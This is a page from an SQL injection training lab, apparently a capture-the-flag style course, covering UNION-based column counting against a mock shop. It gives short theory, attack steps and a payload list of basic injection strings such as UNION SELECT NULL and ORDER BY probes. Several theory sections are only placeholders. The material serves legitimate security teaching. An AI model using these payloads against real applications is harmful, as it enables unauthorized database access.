# SQL Injection Training Labs

## HSTU CyberKnights

SQLi Training Labs

* [Dashboard](https://sqli.lab.hstucyberknights.top/)

Labs

* [Lab 1: Auth BypassBeginner](sql-injection-training-labs-6.md)
* [Lab 2: Hidden DataBeginner](../sql-injection-training-labs-6.md)
* [Lab 3: Login BypassBeginner](../sql-injection-training-labs-9.md)
* [Lab 4: UNION ColumnsBeginner](sql-injection-training-labs-4.md)
* [Lab 5: Text ColumnBeginner](sql-injection-training-labs-7.md)
* [Lab 6: Data RetrievalIntermediate](sql-injection-training-labs-1.md)
* [Lab 7: Multi ValuesIntermediate](../sql-injection-training-labs-5.md)
* [Lab 8: Oracle VersionIntermediate](sql-injection-training-labs-5.md)
* [Lab 9: MySQL VersionIntermediate](sql-injection-training-labs.md)
* [Lab 10: DB ContentsAdvanced](../sql-injection-training-labs-3.md)
* [Lab 11: Oracle ContentsAdvanced](../sql-injection-training-labs-11.md)
* [Lab 12: Blind ResponsesAdvanced](../sql-injection-training-labs-8.md)
* [Lab 13: Blind ErrorsAdvanced](../sql-injection-training-labs-7.md)
* [Lab 14: Time DelaysAdvanced](../sql-injection-training-labs-2.md)
* [Lab 15: Time RetrievalAdvanced](../sql-injection-training-labs-4.md)
* [Lab 16: Out-of-BandExpert](sql-injection-training-labs-8.md)
* [Lab 17: OOB ExfilExpert](../sql-injection-training-labs-10.md)
* [Lab 18: XML BypassExpert](sql-injection-training-labs-2.md)
* [Lab 19: Error BasedAdvanced](sql-injection-training-labs-3.md)

Certification

* Final Exam Complete all labs
* Certificate Pass the exam

[hstucyberknights.top](https://www.hstucyberknights.top/)

## Lab 4: UNION Attack - Column Count

Beginner

Exploit SQLi to determine the number of columns returned by the query using UNION SELECT NULL technique.

### Theory

#### Understanding UNION Operator

The `UNION` operator combines results from two or more SELECT statements into a single result set. This is powerful for attackers because it allows extracting data from other tables.

Example:

```sql
SELECT a, b FROM table1
UNION
SELECT c, d FROM table2
```

An attacker can inject a UNION query to retrieve data from sensitive tables like `users`.

#### UNION Rules & Requirements

(Original content placeholder — rules & requirements as described in source.)

#### NULL Value Technique

(Original content placeholder — NULL value technique as described in source.)

#### ORDER BY Technique

(Original content placeholder — ORDER BY technique as described in source.)

### Attack Strategy

{% stepper %}
{% step %}
### Test for SQLi

Inject a single quote to see if the application is vulnerable.

Example:

```
'
```
{% endstep %}

{% step %}
### Confirm SQLi with comment

Use a payload with a comment to confirm injection point.

Example:

```
'--
```
{% endstep %}

{% step %}
### Use UNION SELECT NULL iteratively

Try appending `UNION SELECT NULL` and increase the number of NULLs until the query succeeds, which reveals the number of columns. Example:

```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```
{% endstep %}

{% step %}
### Use ORDER BY to find column limit

Alternatively, use `ORDER BY` with increasing column indices to determine the maximum number of columns.

Example:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
{% endstep %}
{% endstepper %}

### Query Log

No queries executed yet...

### 🛒 ShopZone - Product Catalog

AllTechGiftsOffice

Filter

GET /products?category=All

### Example Payloads

{% code title="payloads.txt" %}
```
Test SQLi:    '
Confirm:      '-- 
UNION 1 col:  ' UNION SELECT NULL--
ORDER BY:     ' ORDER BY 4--
```
{% endcode %}
